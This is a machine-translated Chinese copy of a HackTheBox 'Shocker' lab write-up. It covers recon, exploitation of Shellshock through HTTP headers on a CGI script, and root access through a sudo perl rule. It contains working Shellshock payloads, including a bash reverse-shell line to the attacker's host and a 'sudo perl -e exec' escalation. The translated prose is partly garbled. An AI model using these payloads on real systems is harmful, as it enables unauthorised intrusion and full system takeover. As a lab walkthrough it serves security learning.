# 
Shellshock sudo提权perl


# 0xdf黑客的东西



[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/05/25/htb-shocker.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fshocker-cover.) 

Shocker这个名字很快就透露了我在这个盒子上需要做什么。一路上有几件事要注意。首先，当目录暴力破解时，我需要小心，因为服务器配置错误，因为cgi-bin目录在没有尾部斜杠的情况下不会显示。这意味着像去破坏者和费罗克斯破坏者这样的工具在默认状态下会错过它。我将展示手动利用《ShellShock》和使用 nmap 脚本识别它是否容易受到攻击。根是一个简单的去走肉在perl。在《超越根》中，我将研究 Apache 配置，然后进入一个兔子洞，看看在 ShellShock 中，哪些命令会导致执行停止，并尝试展示我如何实验以提出一个似乎可以解释正在发生的事情的理论。

## 箱子信息

名字

[令人 震惊](https://www.hackthebox.eu/home/machines/profile/108) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-shocker.png) 

发行日期

30 9月 2017

停用日期

17 2月 2018

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fshocker-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fshocker-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

16 分 45 秒[![陀思妥耶夫斯基实验室](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F10510)](https://www.hackthebox.eu/home/users/profile/10510)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

27 分 23 秒[![陀思妥耶夫斯基实验室](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F10510)](https://www.hackthebox.eu/home/users/profile/10510)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F2984)](https://www.hackthebox.eu/home/users/profile/2984)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （2222） 和 HTTP （80）：

    oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.56
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 06:29 EDT
    Nmap scan report for 10.10.10.56
    Host is up (0.025s latency).
    Not shown: 65533 closed ports
    PORT     STATE SERVICE
    80/tcp   open  http
    2222/tcp open  EtherNetIP-1
    
    Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
    oxdf@parrot$ nmap -p 80,2222 -sCV -oA scans/nmap-tcpscripts 10.10.10.56
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 06:30 EDT
    Nmap scan report for 10.10.10.56
    Host is up (0.018s latency).
    
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
    |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
    |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
    

根据[开放SSH](https://packages.ubuntu.com/search?keywords=openssh-server)和[阿帕奇](https://packages.ubuntu.com/search?keywords=apache2)版本，主机可能运行的是Ubuntu 16.04。

### 网站 - TCP 80

#### 网站

该网站非常简单：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210516063155550.png) 

页面源代码非常短：

    <!DOCTYPE html>
    <html>
    <body>
    
    <h2>Don't Bug Me!</h2>
    <img src="bug.jpg" alt="bug" style="width:450px;height:350px;">
    
    </body>
    </html> 
    

#### 目录暴力破解

[FeroxBuster](https://github.com/epi052/feroxbuster)，即使有几个扩展只是一个猜测，也只能找到和一个403禁止，这是阿帕奇的典型特征：`index.html``server-status`

    oxdf@parrot$ feroxbuster -u http://10.10.10.56 -x php,html
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.2.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.56
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.2.1
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     💲  Extensions            │ [php, html]
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    200        9l       13w      137c http://10.10.10.56/index.html
    403       11l       32w      299c http://10.10.10.56/server-status
    [####################] - 42s   179994/179994  0s      found:2       errors:0      
    [####################] - 42s    89997/89997   2133/s  http://10.10.10.56
    

《冲击者》上有一个配置错误，值得理解。通常，大多数 Web 服务器会通过发送重定向到同一路径但带有尾部斜杠来处理对没有尾部斜杠的目录的请求。但是在这种情况下，Shocker上有一个目录，该目录发送了一个404未找到，其中没有尾部斜杠的访问量。我将深入探讨配置以及原因。

像[dirsearch](https://github.com/maurosoria/dirsearch)这样的工具，实际上获取输入单词列表并循环访问每个发送两个请求的条目，带和不带尾部斜杠。这在像Shucker这样的情况下确实很有帮助，但每次扫描时发送的请求量（以及时间）都会增加一倍。两者都有一个标志来强制将 添加到目录的末尾。对于 Shocker 来说，与`dirb``gobuster``feroxbuster``-f``/``-f`

    oxdf@parrot$ feroxbuster -u http://10.10.10.56 -f -n
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.2.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.56
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.2.1
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🪓  Add Slash             │ true
     🚫  Do Not Recurse        │ true
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    403       11l       32w      294c http://10.10.10.56/cgi-bin/
    403       11l       32w      292c http://10.10.10.56/icons/
    403       11l       32w      300c http://10.10.10.56/server-status/
    [####################] - 15s    29999/29999   0s      found:3       errors:0      
    [####################] - 14s    29999/29999   2039/s  http://10.10.10.56
    

我显示与，因为在印刷品中爬行一吨与.`-n``/server-status``-f`

`feroxbuster`再次在目录中使用一些用于[CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface)的常见脚本类型：`/cgi-bin/`

    oxdf@parrot$ feroxbuster -u http://10.10.10.56/cgi-bin/ -x sh,cgi,pl
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.2.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.56/cgi-bin/
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.2.1
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     💲  Extensions            │ [sh, cgi, pl]
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    200        7l       17w        0c http://10.10.10.56/cgi-bin/user.sh
    [####################] - 57s   359988/359988  0s      found:1       errors:0      
    [####################] - 57s   119996/119996  2089/s  http://10.10.10.56/cgi-bin/
    

只有一个，.`user.sh`

#### user.sh

访问会返回一个 Firefox 不确定如何处理的文件：`/cgi-bin/user.sh`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210516070304995.png) 

在文本编辑器中打开它将显示以下内容：

    Content-Type: text/plain
    
    Just an uptime test script
    
     07:03:54 up 13:33,  0 users,  load average: 0.06, 0.11, 0.04
    
    

对于黑客Shocker来说并不重要，但是Firefox弹出打开或保存文件对话框而不是在浏览器中显示此对话框的原因可以在原始响应中看到（在Burp中看到）：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210516070515215.png) 

标头是 ，这不是 Firefox 知道该怎么做的，所以它进入了原始文件对话框。看起来脚本可能试图添加一个标题，但它是在空行之后，所以它在正文中而不是标题。`Content-Type``text/x-sh``text/plain`

更重要的是，这看起来像是Linux中命令的输出，这表明这是一个在冲击器上运行的CGI bash脚本：`uptime`

    oxdf@parrot$ uptime
     07:08:38 up 5 days, 16:27, 35 users,  load average: 0.00, 0.08, 0.18
    

## 壳体作为雪莉

### 炮弹冲击背景

[外壳冲击](https://en.wikipedia.org/wiki/Shellshock_(software_bug))，又名巴什多尔或CVE-2014-6271，是2014年在Bash中发现的一个漏洞，与用于定义函数的Bash语法有关。它允许攻击者在应该只执行安全操作（如定义环境变量）的地方执行命令。最初的 POC 是这样的：

    env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
    

这是一件大事，因为许多不同的程序会接受用户输入并使用它来定义环境变量，其中最着名的是基于CGI的Web服务器。例如，通常将用户代理字符串存储在环境变量中。由于UA字符串完全由攻击者控制，这导致在这些系统上远程执行代码。

### 寻找贝壳冲击

#### 手动地

如果我可以根据CGI脚本和该框的名称假设ShellShock是这里的向量，我可以手动测试。我会把请求发给打嗝中继器，然后玩一会儿。由于 UA 字符串是通用目标，因此我将尝试在此处添加 POC：`user.sh`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210517074858892.png) 

需要注意的两个潜在问题。首先，命令需要完整路径，因为变量在执行 ShellShock 的环境中为空。`$PATH`

接下来，我需要 作为第一个命令运行，以使响应在 HTTP 响应中返回，但它确实以任何一种方式运行。例如，我将执行 .发送显示我的 VM 上的 ICMP 数据包：`echo;``ping``User-Agent: () { :;}; echo; /bin/ping -c 1 10.10.14.15``tcpdump`

    07:52:43.101742 IP 10.10.10.56 > 10.10.14.15: ICMP echo request, id 12866, seq 1, length 64
    07:52:43.101766 IP 10.10.14.15 > 10.10.10.56: ICMP echo reply, id 12866, seq 1, length 64
    

结果在响应中返回：

    HTTP/1.1 200 OK
    Date: Mon, 17 May 2021 11:57:37 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Connection: close
    Content-Type: text/x-sh
    Content-Length: 261
    
    PING 10.10.14.15 (10.10.14.15) 56(84) bytes of data.
    64 bytes from 10.10.14.15: icmp_seq=1 ttl=63 time=18.9 ms
    
    --- 10.10.14.15 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 18.955/18.955/18.955/0.000 ms
    

如果我删除 ， 并发送 ，仍然看到 ICMP 数据包，但来自服务器的响应是 500。我认为如果没有换行符，它会将输出放在HTTP标头中，这是标头中不合规的内容，导致崩溃。也就是说，我无法获得诸如创建换行符并返回结果之类的东西（尽管它阻止了500）。我没有很好的解释为什么，但也不能放手，所以在Beyond Root中更多。`echo;``User-Agent: () { :;}; /bin/ping -c 1 10.10.14.15``tcpdump``python3 -c 'print()'`

#### n地图

`nmap`有一个[脚本](https://nmap.org/nsedoc/scripts/http-shellshock.html)来测试《炮弹奇兵》。我需要为它提供URI，以便脚本进行检查：

    oxdf@parrot$ nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 07:17 EDT
    Nmap scan report for 10.10.10.56
    Host is up (0.019s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    | http-shellshock: 
    |   VULNERABLE:
    |   HTTP Shellshock vulnerability
    |     State: VULNERABLE (Exploitable)
    |     IDs:  CVE:CVE-2014-6271
    |       This web application might be affected by the vulnerability known
    |       as Shellshock. It seems the server is executing commands injected
    |       via malicious HTTP headers.
    |             
    |     Disclosure date: 2014-09-24
    |     References:
    |       http://www.openwall.com/lists/oss-security/2014/09/24/10
    |       http://seclists.org/oss-sec/2014/q3/685
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds
    

我在《窃听》中捕捉到了它，看看它在做什么。具有漏洞利用检查的请求是：

    GET /cgi-bin/user.sh HTTP/1.1
    Connection: close
    Referer: () { :;}; echo; echo -n kgbyrbl; echo pkzxdko
    Cookie: () { :;}; echo; echo -n kgbyrbl; echo pkzxdko
    User-Agent: () { :;}; echo; echo -n kgbyrbl; echo pkzxdko
    Host: 10.10.10.56
    

首先，值得注意的是，从技术上讲，这是在扫描的机器上执行代码。因此，虽然它只是一个，但它仍然是RCE，所以值得知道这一点，并确保你在范围/法律/道德范围内。`echo`

结果是两个字符串的多次打印，表明此处的 ShellShock 在 、 和 中是成功的。`Referer``Cookie``User-Agent`

### 壳

我将在 tcp 443 上启动一个侦听器，然后发送以下内容：`nc`

    User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1
    

Web 请求挂起，我在以下位置得到一个 shell：`nc`

    oxdf@parrot$ nc -lvnp 443
    listening on [any] 443 ...
    connect to [10.10.14.15] from (UNKNOWN) [10.10.10.56] 45314
    bash: no job control in this shell
    shelly@Shocker:/usr/lib/cgi-bin$
    

我将用正常的技巧得到一个完整的外壳：

    shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("bash")'
    python3 -c 'import pty;pty.spawn("bash")'
    shelly@Shocker:/usr/lib/cgi-bin$ ^Z
    [1]+  Stopped                 nc -lvnp 443
    oxdf@parrot$ stty raw -echo ; fg
    nc -lvnp 443
                reset
    reset: unknown terminal type unknown
    Terminal type? screen
                                                                             
    shelly@Shocker:/usr/lib/cgi-bin$
    

并得到 ：`user.txt`

    shelly@Shocker:/home/shelly$ cat user.txt
    2715b1ad************************
    

## 外壳作为根

### 列举

在上传任何类型的枚举脚本之前，我还手动检查，它在这里得到了回报：`sudo -l`

    shelly@Shocker:/home/shelly$ sudo -l
    Matching Defaults entries for shelly on Shocker:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User shelly may run the following commands on Shocker:
        (root) NOPASSWD: /usr/bin/perl
    

雪莉可以作为根运行。`perl`

### 壳

`perl`有一个选项，允许我从命令行运行Perl。它还具有一个将运行 shell 命令的命令。综上所述，我可以以root身份运行：`-e``exec``bash`

    shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/bash"'
    root@Shocker:/home/shelly#
    

这足以抓住：`root.txt`

    root@Shocker:~# cat root.txt
    3675a0fa************************
    

## 超越根

### 阿帕奇配置

当我第一次在 Apache 上找到以 404 未找到响应的目录时，我以为这是由于 [Apache 指令](http://httpd.apache.org/docs/2.2/mod/mod_dir.html#directoryslash)：`/cgi-bin/``/cgi-bin``DirectorySlash`

> 该指令确定是否应修正指向目录的 URL。`DirectorySlash``mod_dir`
> 
> 通常，如果用户请求一个没有尾部斜杠（指向目录）的资源，则会将他重定向到同一资源，但出于一些很好的原因_，使用_尾部斜杠：`mod_dir`
> 
> *   用户最终请求资源的规范 URL
> *   `mod_autoindex`工作正常。由于它不会发出链接中的路径，因此会指向错误的路径。
> *   `DirectoryIndex`将_仅_针对使用尾部斜杠请求的目录进行评估。
> *   网页内的相对网址引用将正常工作。
> 
> 如果您不希望出现这种效果_，并且_上述原因不适用于您，则可以关闭重定向，如下所示。

此指令的默认值为 ，表示重定向是默认行为。`On`

但是在生根之后，我找不到这个指令。我还注意到这不是在：`cgi-bin``/var/www/html`

    root@Shocker:/var/www/html# ls
    bug.jpg  index.html
    

将 CGI 脚本存储在 中显然是标准做法。实际上，当我第一次登陆 shell 时，当前的目录是 。`/usr/lib``/usr/lib/cgi-bin`

当我开始查看其他Apache配置文件时，这个谜团解开了，特别是：`/etc/apache2/conf-enabled/serve-cgi-bin.conf`

    <IfModule mod_alias.c>
            <IfModule mod_cgi.c>
                    Define ENABLE_USR_LIB_CGI_BIN
            </IfModule>
    
            <IfModule mod_cgid.c>
                    Define ENABLE_USR_LIB_CGI_BIN
            </IfModule>
    
            <IfDefine ENABLE_USR_LIB_CGI_BIN>
                    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
                    <Directory "/usr/lib/cgi-bin">
                            AllowOverride None
                            Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                            Require all granted
                    </Directory>
            </IfDefine>
    </IfModule>
    
    # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
    

该行将匹配到请求并将它们别名到目录中。但只有当有尾部斜杠时，它才会匹配！`ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/``/cgi-bin/``/usr/lib/cgi-bin/`

为了测试这一点，我删除了尾部斜杠，留下了：

    ScriptAlias /cgi-bin /usr/lib/cgi-bin/
    

然后我在冲击器（，）上重置了阿帕奇，并做了一个：`service apache2 restart``curl`

    oxdf@parrot$ curl http://10.10.10.56/cgi-bin
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>301 Moved Permanently</title>
    </head><body>
    <h1>Moved Permanently</h1>
    <p>The document has moved <a href="http://10.10.10.56/cgi-bin/">here</a>.</p>
    <hr>
    <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
    </body></html>
    

It returned 301 moved permanently.

When I added the slash back into the config and restarted Apache again, it went back to 404:

    oxdf@parrot$ curl http://10.10.10.56/cgi-bin
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL /cgi-bin was not found on this server.</p>
    <hr>
    <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
    </body></html>
    

### 炮弹冲击链式命令

我注意到我需要从 开始，以便 ShellShock 结果在 HTTP 请求中返回，否则服务器返回 500。我认为这是为了将HTTP标头与正文分开，如果没有它，Apache就会崩溃。为了验证这个理论，我试图用 替换，但奇怪的事情发生了。它没有崩溃，但它也没有返回任何数据。`echo``echo``python3 -c 'print()'`

我开始了一系列的实验，直到我想弄清楚发生了什么。

我的第一个想法是，也许Python正在输出不同的信息。至少在我的机器上，情况并非如此：`echo`

    oxdf@parrot$ python3 -c 'print()' | xxd
    00000000: 0a                                       .
    oxdf@parrot$ echo | xxd
    00000000: 0a 
    

看看每个完成的方式也没有显示出太大的差异：

    oxdf@parrot$ strace echo
    ...[snip]...
    write(1, "\n", 1
    )                       = 1
    close(1)                                = 0
    close(2)                                = 0
    exit_group(0)                           = ?
    +++ exited with 0 +++
    
    oxdf@parrot$ strace python3 -c 'print()'
    ...[snip]...
    write(1, "\n", 1
    )                       = 1
    rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fd36b83a140}, {sa_handler=0x6402c0, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fd36b83a140}, 8) = 0
    brk(0xdc5000)                           = 0xdc5000
    exit_group(0)                           = ?
    +++ exited with 0 +++
    

我开始做实验，看看问题可能是什么。

UA 字符串

断续器代码

在转储时执行 ping 操作

输出（以恢复）为单位

`User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("echo")'; /bin/ping -c 1 10.10.14.15`

200

0

没有

`User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("/bin/ping -c 1 10.10.14.15")'; /bin/ping -c 1 10.10.14.15`

500

1

错误

`User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("echo; /bin/ping -c 2 10.10.14.15")'; /bin/ping -c 1 10.10.14.15`

200

2

来自蟒蛇的平结果

`User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping -c 1 10.10.14.15")'; /usr/bin/id`

200

1

平整结果

我很快注意到Python运行后什么都没有。我花了一段时间试图弄清楚Python有什么奇怪之处，但这是看待它的错误方式。我最终尝试了Perl：

UA 字符串

断续器代码

在转储时执行 ping 操作

输出（以恢复）为单位

`User-Agent: () { :;}; /usr/bin/perl -e 'print "\n"'; /bin/ping -c 1 10.10.14.15`

200

0

没有

同样的结果。之后呢？`ping``ping`

UA 字符串

断续器代码

在转储时执行 ping 操作

输出（以恢复）为单位

`User-Agent: () { :;}; echo; /bin/ping -c 1 10.10.14.15; /bin/ping -c 1 10.10.14.15; /bin/ping -c 1 10.10.14.15;`

200

1

一组平

看起来越来越多，任何命令都会杀死执行。那为什么不呢？嗯，是一个巴什内置的。其他内置的呢（请参阅），如 和 ？`echo``echo``man bash``printf``dirs`

UA 字符串

断续器代码

在转储时执行 ping 操作

输出（以恢复）为单位

`User-Agent: () { :;}; printf "\n"; /usr/bin/id`

200

不适用

`id`

`User-Agent: () { :;}; echo; dirs; /usr/bin/id`

200

不适用

和 的输出`dirs``id`

在这一点上，我没有任何证据（我可以去调试Apache，但是呃，线程，听起来像是一个巨大的痛苦）。我确实有一个很好的理论，我找不到反例，那就是：Shellshock将运行尽可能多的Bash内置子，就像第一个二进制文件一样，然后停止。对此稍有注意的是，管道似乎不会破坏它。例如，我可以通过管道进入来获取输出的前10个字符，而不会出现问题，即使两者都不是内置的：`id``cut``cut``id`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210517213416440.png) 

`;`、和 “都”之后似乎在这一点上破坏了执行。`&&``||`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/05/25/htb-shocker.html)